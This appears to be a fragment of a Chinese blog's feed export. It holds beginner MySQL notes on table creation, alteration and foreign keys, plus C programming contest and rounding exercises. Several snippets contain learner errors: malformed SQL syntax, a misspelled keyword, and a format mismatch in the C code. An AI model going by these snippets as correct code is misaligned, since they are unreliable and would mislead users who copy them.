href="#数据库的数据类型" class="headerlink" title="数据库的数据类型"></a>数据库的数据类型</h1><h2 id="数值"><a href="#数值" class="headerlink" title="数值"></a>数值</h2><ul><li>tinyint 十分小的数据 1个字节</li><li>smallint 较小的数据  2个字节</li><li><strong>int 标准的整数  4个字节</strong></li><li>bigint 较大的数据 8个字节</li><li>float 浮点数 4个字节 </li><li>double 浮点数 8个字节 （精度问题）</li><li>decimal 字符串形式的浮点数 金融计算一般使用decimal</li></ul><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><ul><li>char 字符串 固定大小 0-255</li><li><strong>varchar 可变长字符串 0-65535</strong> 常用的变量 String</li><li>tinytext 微型文本 2^8 - 1 </li><li>text 文本串 2^16 - 1 保存大文本</li><li></li></ul><h2 id="时间日期"><a href="#时间日期" class="headerlink" title="时间日期"></a>时间日期</h2><ul><li>date YYYY-MM-DD，日期格式</li><li>time HH:mm:ss 时间格式 </li><li><strong>datetime 最常用的时间格式</strong></li><li><strong>timestamp 时间戳,1970.1.1 到现在的毫秒数！</strong></li><li>year 年份</li></ul><h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><ul><li>没有值或未知<br><strong>注意， 不要使用null进行运算，结果位NULL</strong></li></ul><h1 id="数据库的字段属性"><a href="#数据库的字段属性" class="headerlink" title="数据库的字段属性"></a>数据库的字段属性</h1><p><em>Unsigned</em>:</p><ul><li>无符号的整数</li><li>声明了该列不能声明为负数</li></ul><p><em>zerofill</em>:</p><ul><li>0填充的</li><li>不足的位数，使用0来填充，int(3), 5—005</li></ul><p> <em>自增</em></p><ul><li>通常理解为，自动在上一条记录的基础上+1（默认）</li><li>通常用来设计唯一的主键-index，必须是整数类型</li><li>可以自定义设计主键自增的起始值和步长</li></ul><p> <em>非空 Null not null</em></p><ul><li>假设设施为not null，如果不给它赋值，就会报错！</li><li>NULL,如果不填值，默认为NULL</li></ul><p> <em>默认</em> </p><ul><li>设置默认值</li><li>sex，比如默认值为男，如果不指定该列的值，则默认为男</li></ul><h3 id="student-1"><a href="#student-1" class="headerlink" title="student 1"></a>student 1</h3> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 目标：创建一个scahool数据库</span></span><br><span class="line"><span class="comment">-- 创建学生表（列，字段） 使用SQL创建</span></span><br><span class="line"><span class="comment">-- 学号int 登陆密码varchar（20） 姓名，性别varcahr（2），出生日期（datatime），家庭住址，email</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 注意点，使用英文（），表的名称和字段尽量用``括起来</span></span><br><span class="line"><span class="comment">-- AUTO_INCREMENT 自增</span></span><br><span class="line"><span class="comment">-- 字符串使用单引号括起来！</span></span><br><span class="line"><span class="comment">-- 所有的语句后面加,(英文的)，最后一个不用加</span></span><br><span class="line"><span class="comment">-- primary key ,主键一般一个表只有一个唯一的主键</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `student3` (</span><br><span class="line">`id` <span class="type">INT</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;学号&#x27;</span>,</span><br><span class="line">`name` <span class="type">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;匿名&#x27;</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">`password` <span class="type">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;123456&#x27;</span> COMMENT <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">`sex` <span class="type">VARCHAR</span>(<span class="number">2</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;无&#x27;</span> COMMENT <span class="string">&#x27;性别&#x27;</span>,</span><br><span class="line">`birthday` DATETIME <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;出生日期&#x27;</span>,</span><br><span class="line">`address` <span class="type">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;家庭住址&#x27;</span>,</span><br><span class="line">`email` <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;邮箱&#x27;</span>,</span><br><span class="line"><span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>INNODB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br><span class="line"><span class="comment">-- 这个冒号在SQLyog可加可不加</span></span><br></pre></td></tr></table></figure><p> <strong>格式</strong><br> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> [if <span class="keyword">not</span> <span class="keyword">exists</span>] `表名`(</span><br><span class="line">    <span class="string">&#x27;字段名1&#x27;</span> 列类型 [属性][索引][注释],</span><br><span class="line">    <span class="string">&#x27;字段名2&#x27;</span> 列类型 [属性][索引][注释],</span><br><span class="line">    #...</span><br><span class="line">    <span class="string">&#x27;字段名n&#x27;</span> 列类型 [属性][索引][注释]</span><br><span class="line">)[表类型][表字符集][注释];</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> DATABASE school <span class="comment">-- 查看创建数据库的语句</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> student <span class="comment">-- 查看student数据表的定义语句</span></span><br><span class="line"><span class="keyword">DESC</span> student <span class="comment">-- 显示表的结构</span></span><br></pre></td></tr></table></figure><h2 id="数据表的类型"><a href="#数据表的类型" class="headerlink" title="数据表的类型"></a>数据表的类型</h2> <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 关于数据库引擎</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">INNODB 默认使用~</span></span><br><span class="line"><span class="comment">MYISAM 早些年使用的</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th></th><th>MYISAM</th><th>INNODB</th></tr></thead><tbody><tr><td>事务支持</td><td>不支持</td><td>支持</td></tr><tr><td>数据行锁定</td><td>不支持</td><td>支持</td></tr><tr><td>外键约束</td><td>不支持</td><td>支持</td></tr><tr><td>全文索引</td><td>支持</td><td>不支持</td></tr><tr><td>表空间大小</td><td>较小</td><td>较大，约为2倍</td></tr><tr><td>常规使用操作：</td><td></td><td></td></tr></tbody></table><ul><li>MYISAM 节约空间，速度较快</li><li>INNODB 安全性高，多表多用户操作</li></ul><p> 在物理空间的位置:<br> 所有的数据库文件都在data目录下<br> 本质还是文件的存储</p><p> MySQL引擎在物理文件上的去呗</p><ul><li>InnoDB 在数据库表中只有一个*.frm文件，以及上级目录下的ibdata1文件</li><li>MYISAM<ol><li>*.frm 表结构的定义文件</li><li>*.MYD 数据文件（data) </li><li>*myi 索引文件(index)<br>设置数据库表的字符集编码<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">CHARSET<span class="operator">=</span>utf8</span><br></pre></td></tr></table></figure><em>不设置的话，会时MySQL默认的字符集（不支持中文）</em><br>MySQL的默认便把时Latin1<br>可在my.ini修改</li></ol></li></ul><h2 id="修改表"><a href="#修改表" class="headerlink" title="修改表"></a>修改表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher rename <span class="keyword">as</span> teacher1； <span class="comment">-- 修改表名</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher1 <span class="keyword">add</span> age <span class="type">int</span>(<span class="number">11</span>)； <span class="comment">-- 增加字段</span></span><br></pre></td></tr></table></figure><h3 id="修改表的字段-重命名，修改约束！"><a href="#修改表的字段-重命名，修改约束！" class="headerlink" title="修改表的字段(重命名，修改约束！)"></a>修改表的字段(重命名，修改约束！)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher1 modify age <span class="type">varchar</span>(<span class="number">11</span>); <span class="comment">-- 修改约束</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher1 change age age1 <span class="type">int</span>(<span class="number">1</span>); <span class="comment">-- 字段重命名</span></span><br><span class="line"><span class="comment">-- change 用来字段重命名，不能修改字段类型和约束</span></span><br><span class="line"><span class="comment">-- modify 不用来字段重命名，之恶能修改类型和约束</span></span><br></pre></td></tr></table></figure><h2 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> teacher1 <span class="keyword">drop</span> age; <span class="comment">-- 删除表的字段</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> teacher1p; <span class="comment">-- 删除整个表</span></span><br></pre></td></tr></table></figure><p><em>所有的创建和和三处操作尽量加上判断，以免报错</em></p><p>注意点:</p><ul><li>&#96;&#96;字段名用这个包裹</li><li>注释– &#x2F;**&#x2F;</li><li>sql关键字大小写不敏感，建议小写</li><li>所有的符号用英文</li></ul><h1 id="Mysql的数据管理"><a href="#Mysql的数据管理" class="headerlink" title="Mysql的数据管理"></a>Mysql的数据管理</h1><h2 id="3-1-外键-了解即可"><a href="#3-1-外键-了解即可" class="headerlink" title="3.1. 外键(了解即可"></a>3.1. 外键(了解即可</h2><p>方式一:在创建表的时候，增加约束</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 学生表的gradeid字段，要去引用年级表的gradeid</span></span><br><span class="line"><span class="comment">-- 定义外键key</span></span><br><span class="line"><span class="comment">-- 给这个外键添加约束 (执行引用) references 引用</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `student` (</span><br><span class="line">    `id` <span class="type">INT</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;学号&#x27;</span>,</span><br><span class="line">    `name` <span class="type">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;匿名&#x27;</span> COMMENT <span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">    `password` <span class="type">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;123456&#x27;</span> COMMENT <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">    `sex` <span class="type">VARCHAR</span>(<span class="number">2</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;无&#x27;</span> COMMENT <span class="string">&#x27;性别&#x27;</span>,</span><br><span class="line">    `birthday` DATETIME <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;出生日期&#x27;</span>,</span><br><span class="line">    `address` <span class="type">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;家庭住址&#x27;</span>,</span><br><span class="line">    `email` <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;邮箱&#x27;</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY(`id`)</span><br><span class="line">    KEY `FK_gradeid` (`gradeid`)</span><br><span class="line">    <span class="keyword">constraint</span> `FK_gradeid` <span class="keyword">foreign</span> key(`gradeid`) <span class="keyword">references</span> `grade` (`gradeid`)</span><br><span class="line">) ENGINE<span class="operator">=</span>INNODB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br></pre></td></tr></table></figure><p>方式二: 创建表成功后，没有外键关系</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建表的时候没有外键关系</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> `student`</span><br><span class="line"><span class="keyword">add</span> constaint `FK_gradeid` <span class="keyword">foreign</span> key(`gradeid`) <span class="keyword">references</span> `grade` (`gradeid`);</span><br></pre></td></tr></table></figure><p>删除有外键关系的表的时候，必须要先删除引用别人的表（从表），再删除主表</p><p>以上的操作都是物理外键，数据库级别的外键，我们不建议使用！（避免数据库过多困扰）</p><p><em>最佳实践</em></p><ul><li>数据库就是单纯的表，只用来存数据，只有行（数据）和列（字段）</li><li>我们想使用多张表的数据，想使用外键（程序去使用）</li><li></li></ul><h2 id="3-2-DML语言-全部记住"><a href="#3-2-DML语言-全部记住" class="headerlink" title="3.2. DML语言(全部记住)"></a>3.2. DML语言(全部记住)</h2><p>数据库意义:数据存储、数据管理<br>DML语言：数据操作语言</p><ul><li>insert</li><li>update</li><li>delet</li></ul><h3 id="3-2-1-添加insert"><a href="#3-2-1-添加insert" class="headerlink" title="3.2.1 添加insert"></a>3.2.1 添加insert</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 插入语句（添加）</span></span><br><span class="line"><span class="comment">-- insert into 表名([字段名1，字段2，字段3])values(&#x27;值1&#x27;),(&#x27;值2&#x27;)....</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `grade`(`gradename`) <span class="keyword">values</span>(`大四`);</span><br><span class="line"><span class="comment">--由于主键自增，我们可以省略(如果不写表的字段就会一一匹配)</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `grade` <span class="keyword">values</span>(<span class="string">&#x27;大三&#x27;</span>);</span><br><span class="line"><span class="comment">-- 一般写插入语句，我们一定要数据和字段一一对应！</span></span><br><span class="line"><span class="comment">-- 插入多个字段</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `grade`(`gradename`) <span class="keyword">values</span>(<span class="string">&#x27;大二&#x27;</span>),(<span class="string">&#x27;大一&#x27;</span>,)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `student`(`name`) <span class="keyword">values</span> (<span class="string">&#x27;张三&#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `student`(`name`,`pwd`,`sex`) <span class="keyword">values</span>(<span class="string">&#x27;李四&#x27;</span>,<span class="string">&#x27;aaaaa&#x27;</span>,<span class="string">&#x27;男&#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> `student` <span class="keyword">values</span> (<span class="number">5</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;2001-02-01&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;西安&#x27;</span>,<span class="string">&#x27;Email&#x27;</span>)</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>字段和字段之间使用英文逗号隔开</li><li>字段是可以省略的，但是后面的值必须一一对应</li><li>可以同时插入多条数据，values后面的值，需要使用逗号隔开</li></ul><h3 id="3-2-2-修改"><a href="#3-2-2-修改" class="headerlink" title="3.2.2 修改"></a>3.2.2 修改</h3><h3 id="3-2-3-删除"><a href="#3-2-3-删除" class="headerlink" title="3.2.3 删除"></a>3.2.3 删除</h3><h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2>]]></content>
      
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>牛客小白赛68失败经验</title>
      <link href="/2023/03/12/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E8%B5%9B68%E5%A4%B1%E8%B4%A5%E7%BB%8F%E9%AA%8C/"/>
      <url>/2023/03/12/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD%E8%B5%9B68%E5%A4%B1%E8%B4%A5%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="参赛经历"><a href="#参赛经历" class="headerlink" title="参赛经历"></a>参赛经历</h1><p>本来是去初学者试炼营，偶然点进小白赛，发现参赛的方式不是很复杂，蛮试一下</p><h1 id="A题"><a href="#A题" class="headerlink" title="A题"></a>A题</h1><h2 id="Tokitsukaze-and-New-Operation"><a href="#Tokitsukaze-and-New-Operation" class="headerlink" title="Tokitsukaze and New Operation"></a>Tokitsukaze and New Operation</h2><p><img src="https://s2.loli.net/2023/03/12/GaZ1gIvte2FpdSi.png" alt="1.png"><br><img src="https://s2.loli.net/2023/03/12/n7ZzfrcdYVL4lyU.png" alt="2.png"></p><p>我的思路是用模10，除10的方法遍历每位数，再去做，途中也遇到很多问题，相乘小于10，要乘的10的不同次方，在解决种种问题后，自测运行过了</p><h3 id="判断位数是否一致"><a href="#判断位数是否一致" class="headerlink" title="判断位数是否一致"></a>判断位数是否一致</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">istrue</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> countx = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> county = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">x = x / <span class="number">10</span>;</span><br><span class="line">countx++;</span><br><span class="line">&#125;<span class="keyword">while</span> (x != <span class="number">0</span>);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">y = y / <span class="number">10</span>;</span><br><span class="line">county++;</span><br><span class="line">&#125;<span class="keyword">while</span> (y != <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (countx == county)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="计算各位数相乘"><a href="#计算各位数相乘" class="headerlink" title="计算各位数相乘"></a>计算各位数相乘</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">cacux</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> num = x;<span class="comment">//注意x的值不能变，引入变量 </span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">num = num / <span class="number">10</span>;</span><br><span class="line">count++;</span><br><span class="line">&#125;<span class="keyword">while</span> (num != <span class="number">0</span>);</span><br><span class="line"><span class="comment">//printf(&quot;%d\n&quot;, count);</span></span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">&#123;</span><br><span class="line">ret += (x % <span class="number">10</span>) * (y % <span class="number">10</span>) * <span class="built_in">pow</span>(<span class="number">10</span>, j);</span><br><span class="line"><span class="keyword">if</span> ((x % <span class="number">10</span>) * (y % <span class="number">10</span>) &lt; <span class="number">10</span>)</span><br><span class="line">j = j + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">j = j + <span class="number">2</span>;</span><br><span class="line">x = (x - (x % <span class="number">10</span>)) / <span class="number">10</span>;</span><br><span class="line">y = (y - (y % <span class="number">10</span>)) / <span class="number">10</span>;</span><br><span class="line"><span class="comment">//printf(&quot;%d %d %d\n&quot;, ret, x, y);</span></span><br><span class="line"><span class="comment">//为0的话就不能往上，&lt;10 </span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%ld %ld&quot;</span>, &amp;x, &amp;y);</span><br><span class="line">        <span class="keyword">if</span> (istrue(x, y) == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        a[i] = cacux(x, y); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i] = <span class="number">-1</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="自测运行"><a href="#自测运行" class="headerlink" title="自测运行"></a>自测运行</h3><p><img src="https://s2.loli.net/2023/03/12/Darzk5UVZu7MGf2.png" alt="3.png"></p><p>后面也找出问题了,数字太大越界了，尝试了long long还是不行,看了别人的解答发现根本看不懂。</p><p>😩</p>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学生基本信息输入输出引发的思考</title>
      <link href="/2023/03/11/%E5%AD%A6%E7%94%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2023/03/11/%E5%AD%A6%E7%94%9F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<h1 id="BC11-学生基本信息输入"><a href="#BC11-学生基本信息输入" class="headerlink" title="BC11 学生基本信息输入"></a>BC11 学生基本信息输入</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述:"></a>描述:</h2><p>依次输入一个学生的学号，以及3科（C语言，数学，英语）成绩，在屏幕上输出该学生的学号，3科成绩（注：输出成绩时需进行四舍五入且保留2位小数）。</p><h2 id="数据范围："><a href="#数据范围：" class="headerlink" title="数据范围："></a>数据范围：</h2><p>学号满足 1≤n≤20000000,各科成绩使用百分制，且不可能出现负数</p><h2 id="输入描述："><a href="#输入描述：" class="headerlink" title="输入描述："></a>输入描述：</h2><p>学号以及3科成绩，学号和成绩之间用英文分号隔开，成绩之间用英文逗号隔开。</p><h2 id="输出描述："><a href="#输出描述：" class="headerlink" title="输出描述："></a>输出描述：</h2><p>学号，3科成绩，输出格式详见输出样例。</p><h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>在开始读入数据时，刚想用int存储学号，想到int能够存取整数的范围，它存的下吗？</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;int size is %d byte.\n&quot;</span> , <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/ZcQwRAYFfjDimXl.png" alt="image.png"></p><p>实际上int的取值范围依赖于计算机系统,这里显示的4Byte，说明可以存取的数字范围是-2147483648～2147483647机2^32 ~ 2^32 - 1,所以用int类型就够了。</p><p>剩下的三个数用float即可，但题目又有要求要四舍五入，如果直接用%.2f的形式他会自动四舍五入吗，搜索资料后，答案有的说会，有的又说不会，我自己试了下是可以的，但有的人说不可以，虽然提交OJ是过了，但还是想写个四舍五入的方法，可以采用放大取余再看余数的范围。因为有三个数需要处理，所以我就写一个函数来解决问题</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//三位小数,我就直接先让它放大1000倍 </span></span><br><span class="line"><span class="type">float</span> <span class="title function_">test</span><span class="params">(<span class="type">float</span> a)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> b = a * <span class="number">1000</span>;</span><br><span class="line"><span class="type">int</span> tmp = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">while</span> (tmp &gt;= <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">tmp = b % <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (tmp &lt; <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">a = (<span class="type">float</span>)(b - tmp) / <span class="number">1000</span>; </span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">a = (<span class="type">float</span>)(b + <span class="number">10</span> - tmp) / <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">float</span> a = <span class="number">80.635</span>;</span><br><span class="line"><span class="type">float</span> b = <span class="number">80.630</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, test(a));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, test(b));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/7POT96axM8cILXS.png" alt="image.png"></p><p>附上全代码:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">float</span> <span class="title function_">test</span><span class="params">(<span class="type">float</span> a)</span> &#123;</span><br><span class="line">    <span class="type">int</span> b = a * <span class="number">1000</span>;</span><br><span class="line">    <span class="type">int</span> tmp = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">while</span> (tmp &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">        tmp = b % <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tmp &lt; <span class="number">5</span>) &#123;</span><br><span class="line">        a = (<span class="type">float</span>)(b - tmp) / <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        a = (<span class="type">float</span>)(b + <span class="number">10</span> - tmp) / <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">float</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="type">float</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="type">float</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d;%f,%f,%f&quot;</span>, &amp;n, &amp;a, &amp;b, &amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The each subject score of No. %d is %.2f, %.2f, %.2f.&quot;</span>, n, test(a),</span><br><span class="line">           test(b), test(c));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/qKVIzAuPmN6Jntb.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> OJ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三子棋</title>
      <link href="/2023/03/11/%E4%B8%89%E5%AD%90%E6%A3%8B/"/>
      <url>/2023/03/11/%E4%B8%89%E5%AD%90%E6%A3%8B/</url>
      
